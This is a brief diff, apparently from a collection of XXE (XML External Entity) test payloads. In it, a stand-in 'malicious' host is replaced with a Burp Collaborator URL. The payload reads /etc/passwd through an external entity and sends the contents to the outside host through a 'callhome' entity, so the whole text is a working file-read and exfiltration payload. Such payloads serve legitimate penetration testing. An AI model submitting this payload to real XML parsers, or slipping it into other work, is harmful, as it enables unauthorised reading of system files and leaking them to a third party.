@@ -2,7 +2,7 @@
 <!DOCTYPE foo [
 <!ELEMENT foo ANY >
 <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
-<!ENTITY callhome SYSTEM "www.malicious.com/?%xxe;">
+<!ENTITY callhome SYSTEM "http://o1qaid8nbio4y9myb9s9quqlmcs9gy.burpcollaborator.net/?%xxe;">
 ]
 >
 <foo>&callhome;</foo>
